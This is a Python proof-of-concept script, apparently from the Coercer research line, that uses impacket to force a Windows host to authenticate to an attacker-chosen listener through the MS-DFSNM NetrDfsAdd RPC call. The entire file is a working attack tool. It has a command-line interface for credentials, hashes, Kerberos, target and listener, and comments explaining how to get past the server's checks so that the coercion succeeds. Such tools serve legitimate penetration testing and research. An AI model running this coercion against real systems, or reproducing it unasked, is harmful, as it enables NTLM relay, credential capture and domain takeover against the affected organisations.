#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 01 July 2022


import sys
import argparse
import random
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


def gen_random_name(length=8):
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    name = ""
    for k in range(length):
        name += random.choice(alphabet)
    return name


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code


class NetrDfsAdd(NDRCALL):
    opnum = 1
    structure = (
        ('DfsEntryPath', WSTR),   # Type: WCHAR * [ref], transmitted inline
        ('ServerName', WSTR),     # Type: WCHAR * [ref], transmitted inline
        # ShareName and Comment are [in, unique, string] in the IDL, so they are pointers
        # and carry a referent id. Declared as WSTR the referent id is missing and the
        # server answers rpc_x_bad_stub_data.
        ('ShareName', LPWSTR),    # Type: WCHAR * [unique]
        ('Comment', LPWSTR),      # Type: WCHAR * [unique]
        ('Flags', DWORD),         # Type: DWORD
    )


class NetrDfsAddResponse(NDRCALL):
    structure = ()


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None
    pipe = None

    ncan_target = None
    __rpctransport = None
    dce = None

    def __init__(self):
        super(RPCProtocol, self).__init__()

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        # No set_auth_type/set_auth_level here: netdfs rejects an authenticated bind with
        # bind_nak "authentication type not recognized" (0x8), so the association is bound
        # with no RPC-level security and the call runs under the identity of the SMB
        # session established above.

        print("[>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        print("[>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        return True


class MS_DFSNM(RPCProtocol):
    uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
    version = "3.0"
    pipe = r"\PIPE\netdfs"

    def NetrDfsAdd(self, listener, dfsEntryPath):
        if self.dce is not None:
            print("[>] Calling NetrDfsAdd() ...")
            try:
                request = NetrDfsAdd()
                # The namespace MUST already exist: the server verifies DfsEntryPath and
                # returns ERROR_NOT_FOUND before it ever looks at the link target
                # ([MS-DFSNM] 3.1.4.1.1), so --dfs-path has to name a live namespace.
                request['DfsEntryPath'] = '%s\x00' % dfsEntryPath
                # The DFS link target host name: the argument the server dereferences when
                # it verifies the target exists, which is what coerces the authentication.
                request['ServerName'] = '%s\x00' % listener
                request['ShareName'] = gen_random_name() + '\x00'
                request['Comment'] = gen_random_name() + '\x00'
                # 0 creates the link or adds a target to it. DFS_RESTORE_VOLUME (0x2) would
                # tell the server NOT to verify the target, which is the check being used.
                request['Flags'] = 0
                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")


if __name__ == '__main__':
    print("Windows auth coerce using MS-DFSNM::NetrDfsAdd()\n")
    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsAdd()")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    parser.add_argument("--dfs-path", dest="dfs_path", required=True, help="Path of an EXISTING DFS namespace on the target, e.g. '\\\\\\\\domain.local\\\\namespace'. The server checks this before it ever contacts the listener.")
    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = MS_DFSNM()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.NetrDfsAdd(options.listener, options.dfs_path)

    sys.exit()